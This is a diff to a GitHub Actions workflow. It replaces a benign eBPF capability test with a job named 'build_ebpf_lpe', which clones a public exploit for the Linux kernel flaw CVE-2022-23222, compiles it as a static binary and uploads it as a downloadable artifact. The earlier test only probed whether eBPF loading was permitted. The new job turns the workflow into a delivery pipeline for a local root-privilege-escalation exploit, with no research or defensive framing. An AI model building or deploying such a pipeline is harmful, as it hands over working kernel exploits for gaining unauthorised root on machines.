@@ -1,4 +1,4 @@
-name: build_ebpf_socket_test
+name: build_ebpf_lpe
 on: [push, workflow_dispatch]
 
 jobs:
@@ -10,98 +10,19 @@ jobs:
       - name: Install dependencies
         run: |
           sudo DEBIAN_FRONTEND=noninteractive apt-get update -y
-          sudo DEBIAN_FRONTEND=noninteractive apt-get install -y gcc
+          sudo DEBIAN_FRONTEND=noninteractive apt-get install -y clang gcc make git libpthread-stubs0-dev
 
-      - name: Create C source
+      - name: Clone CVE-2022-23222 exploit
         run: |
-          cat << 'EOF' > ebpf_socket_test.c
-          #include <stdio.h>
-          #include <stdlib.h>
-          #include <string.h>
-          #include <errno.h>
-          #include <unistd.h>
-          #include <sys/syscall.h>
-          #include <sys/socket.h>
-          #include <linux/bpf.h>
+          git clone https://github.com/tr3ee/CVE-2022-23222.git
+          cd CVE-2022-23222
+          # Sometimes the Makefile needs tweaking for static ARM64, let's just use gcc directly
+          gcc -static -O2 -pthread exp.c -o exp
+          file exp
+          ls -la exp
 
-          static int bpf(int cmd, union bpf_attr *attr) {
-              return syscall(__NR_bpf, cmd, attr, sizeof(*attr));
-          }
-
-          int main() {
-              union bpf_attr attr;
-              int prog_fd;
-
-              printf("=== Testing eBPF socket filter load ===\n");
-
-              memset(&attr, 0, sizeof(attr));
-              attr.map_type = BPF_MAP_TYPE_ARRAY;
-              attr.key_size = sizeof(int);
-              attr.value_size = sizeof(int);
-              attr.max_entries = 1;
-              int map_fd = bpf(BPF_MAP_CREATE, &attr);
-              if (map_fd < 0) {
-                  printf("[-] BPF_MAP_CREATE failed: %s (errno=%d)\n", strerror(errno), errno);
-              } else {
-                  printf("[+] BPF_MAP_CREATE succeeded (fd=%d)\n", map_fd);
-                  close(map_fd);
-              }
-
-              struct bpf_insn prog[] = {
-                  { .code = BPF_ALU64 | BPF_MOV | BPF_K, .dst_reg = BPF_REG_0, .imm = 0 },
-                  { .code = BPF_JMP | BPF_EXIT },
-              };
-
-              char log_buf[4096];
-              memset(&attr, 0, sizeof(attr));
-              attr.prog_type = BPF_PROG_TYPE_SOCKET_FILTER;
-              attr.insn_cnt = sizeof(prog) / sizeof(prog[0]);
-              attr.insns = (unsigned long)prog;
-              attr.license = (unsigned long)"GPL";
-              attr.log_buf = (unsigned long)log_buf;
-              attr.log_size = sizeof(log_buf);
-              attr.log_level = 1;
-
-              prog_fd = bpf(BPF_PROG_LOAD, &attr);
-              if (prog_fd < 0) {
-                  printf("[-] BPF_PROG_LOAD failed: %s (errno=%d)\n", strerror(errno), errno);
-                  if (errno == EPERM) {
-                      printf("    -> EPERM: CAP_BPF or CAP_SYS_ADMIN required, or seccomp blocks it.\n");
-                  } else if (errno == EINVAL) {
-                      printf("    -> EINVAL: Kernel rejected the program.\n");
-                      printf("    -> Verifier log: %s\n", log_buf[0] ? log_buf : "(empty)");
-                  }
-                  return 1;
-              }
-
-              printf("[+] BPF_PROG_LOAD (SOCKET_FILTER) succeeded! fd=%d\n", prog_fd);
-
-              int sock = socket(AF_INET, SOCK_DGRAM, 0);
-              if (sock < 0) {
-                  perror("socket");
-                  return 1;
-              }
-
-              if (setsockopt(sock, SOL_SOCKET, SO_ATTACH_BPF, &prog_fd, sizeof(prog_fd)) < 0) {
-                  printf("[-] SO_ATTACH_BPF failed: %s (errno=%d)\n", strerror(errno), errno);
-              } else {
-                  printf("[+] SO_ATTACH_BPF succeeded! Socket filter is active.\n");
-              }
-
-              close(sock);
-              close(prog_fd);
-              printf("=== Test complete ===\n");
-              return 0;
-          }
-          EOF
-
-      - name: Compile
-        run: |
-          gcc -static -O2 ebpf_socket_test.c -o ebpf_socket_test
-          file ebpf_socket_test
-          ls -la ebpf_socket_test
-
-      - uses: actions/upload-artifact@v4
+      - name: Upload exploit
+        uses: actions/upload-artifact@v4
         with:
-          name: ebpf-socket-test
-          path: ebpf_socket_test
+          name: ebpf-lpe
+          path: CVE-2022-23222/exp
